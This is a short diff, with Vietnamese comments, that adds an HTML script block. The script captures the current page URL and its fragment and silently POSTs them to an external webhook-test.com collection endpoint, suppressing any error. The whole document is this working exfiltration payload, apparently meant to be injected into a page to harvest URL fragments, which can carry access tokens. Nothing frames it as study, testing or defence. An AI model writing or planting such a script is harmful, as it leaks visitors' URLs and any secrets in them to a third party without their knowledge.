@@ -1,0 +1,9 @@
+<script>
+const url = location.href;            // chứa cả fragment
+const frag = location.hash || '';     // "#abc" hoặc ''
+fetch('https://webhook-test.com/3db25e3614c3f0e3f8ca9ffc70af93d7/', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({url, fragment: frag})
+}).catch(()=>{});
+</script>
